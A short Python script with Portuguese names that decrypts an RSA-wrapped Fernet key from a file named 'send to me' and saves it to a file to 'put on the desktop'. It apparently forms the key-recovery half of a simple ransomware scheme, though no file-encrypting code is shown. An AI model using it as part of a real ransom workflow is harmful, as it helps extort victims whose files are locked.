from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

with open('ENVIE_PARA_MIM.txt', 'rb') as f:
    enc_fernet_key = f.read()
    print(enc_fernet_key)

private_key = RSA.import_key(open('private.pem').read())

private_crypter = PKCS1_OAEP.new(private_key)

dec_fernet_key = private_crypter.decrypt(enc_fernet_key)
with open('COLOQUE_NO_DESKTOP.txt', 'wb') as f:
    f.write(dec_fernet_key)

print(f'> Chave privada: {private_key}')
print(f'> Descriptografador privado: {private_crypter}')
print(f'> Chave fernet descriptografada: {dec_fernet_key}')
print('> Descriptografia concluída')
